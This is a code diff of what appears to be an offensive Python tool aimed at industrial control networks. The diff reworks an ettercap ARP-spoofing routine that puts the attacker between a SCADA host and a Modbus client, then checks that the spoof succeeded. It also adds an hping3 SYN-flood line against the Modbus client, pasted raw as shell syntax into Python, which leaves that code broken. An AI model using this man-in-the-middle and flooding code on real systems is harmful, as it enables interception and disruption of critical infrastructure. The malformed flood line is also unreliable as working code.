@@ -61,21 +61,43 @@ def clear():
 def etterspoof():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     print("Checking ettercap...")
+    
+    # 1. Check if it's already running
     if subprocess.getoutput("pgrep -x ettercap") == "":
-        intrfce = input("Enter Interface Name: ") 
-        # Launch as Daemon
-        cmd = f"ettercap -TqD -i {intrfce} -M arp:remote /{nm_config.scada_ip}// /{nm_config.modcli_ip}//"
-        os.system(cmd)
+        intrfce = input("Enter Interface Name (e.g., eth1): ") 
         
-        time.sleep(2)
+        # 2. Define the command (Using list format for Popen is safer)
+        cmd = [
+            "ettercap", "-TqD", "-i", intrfce, 
+            "-M", "arp:remote", 
+            f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//"
+        ]
         
-        cmd = ["ettercap", "-TqD", "-i", intrfce, "-M", "arp:remote", f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
-        time.sleep(5)
+        
+        # 3. Launch the process
+        subprocess.Popen(
+            cmd, 
+            stdout=subprocess.DEVNULL, 
+            stderr=subprocess.DEVNULL, 
+            stdin=subprocess.DEVNULL, 
+            start_new_session=True
+        )
+        
+        # --- THE FIX GOES HERE ---
+        print("Waiting for Ettercap to initialize...")
+        time.sleep(3)  # Give it 3 seconds to scan hosts and drop privileges
+        
+        # 4. Final Verification
+        if subprocess.getoutput("pgrep -x ettercap") != "":
+            print("Successfully enabled ARP Spoofing.")
+        else:
+            print("Failed to enable Ettercap. Check /etc/ettercap/etter.conf UID settings.")
+        # -------------------------
 
     else:
         print("Ettercap is already active!")
+    
     time.sleep(1)
 
 def dos():
@@ -103,7 +125,7 @@ def dos():
         print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
         select = input(">> ")
         if select == "1":
-            print("\nNot yet implemented...sorry")
+            hping3 -i u40 -S -p nm_config.mod_port -c 100000 nm_config.modcli_ip
             time.sleep(1)
             dos()
         elif select == "2":
